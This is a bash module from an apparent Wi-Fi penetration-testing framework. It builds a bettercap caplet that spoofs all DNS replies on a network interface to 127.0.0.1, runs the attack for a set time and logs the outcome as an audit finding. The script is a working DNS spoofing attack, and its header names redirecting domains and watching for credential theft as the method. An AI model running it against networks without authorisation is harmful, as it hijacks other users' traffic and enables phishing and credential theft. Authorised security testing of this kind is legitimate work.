#!/usr/bin/env bash
# MODULE_META
# NAME="DNS Spoofing / Redirection"
# CATEGORY="G"
# DEPS="G1"
# CRITICAL="no"
# TOOLS="bettercap,dnsmasq"
# DESC="Attempt to redirect DNS queries to a malicious host"
# REQS="managed_iface"
# PCAP="no"
# DECODE="dns"

#===============================================================================
#  modules/g3_dns_spoofing.sh
#  G3: DNS Spoofing / Redirection (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Use 'bettercap' to intercept and respond to DNS queries from target clients.
#  2. Redirect requests for specific high-value domains (e.g., google.com, 
#     internal.corp) to a local attacker-controlled IP address.
#  3. Monitor for redirected traffic and potential credential theft.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/g3"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G3"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo "[*] Starting DNS spoofing attempt on ${INTERFACE}..."

CAPLET_FILE="${EVIDENCE_PREFIX}_bettercap.cap"
JSON_LOG="${EVIDENCE_DIR}/${TC_ID}_bettercap.json"
LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_bettercap.log"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up bettercap processes..."
    [[ -n "${BC_PID:-}" ]] && kill "$BC_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 1. Use bettercap for DNS spoofing
if command -v bettercap &>/dev/null; then
    echo "[*] Starting bettercap DNS spoofing..."
    
    # Create caplet
    cat <<EOF > "$CAPLET_FILE"
set dns.spoof.all true
set dns.spoof.address 127.0.0.1
set events.stream.output $JSON_LOG
dns.spoof on
events.stream on
EOF

    bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
    BC_PID=$!

    sleep "$SCAN_TIME"
    
    cleanup
    trap - EXIT
    
    # 2. Reporting
    if [[ -f "$JSON_LOG" && -s "$JSON_LOG" ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "DNS Spoofing Active" \
            --severity HIGH \
            --desc "Successfully executed DNS redirection attack against local clients on $INTERFACE." \
            --target "Local Clients" \
            --evidence "$JSON_LOG" \
            --rationale "DNS spoofing allows an attacker to redirect users to malicious clones of legitimate websites. This is a primary vector for phishing, credential theft, and malware distribution."
    else
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[G3] Audit Complete" \
            --severity INFO \
            --desc "DNS spoofing attack cycle finished. No active DNS queries were intercepted or spoofed." \
            --target "Local Clients" \
            --evidence "$LOG_FILE" \
            --rationale "Modern clients and browsers use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT), which mitigates traditional DNS spoofing. This audit confirms whether the target environment is susceptible to basic UDP-based DNS redirection."
    fi
else
    echo "[!] bettercap not found. Skipping DNS spoofing test."
    exit 1
fi

exit 0
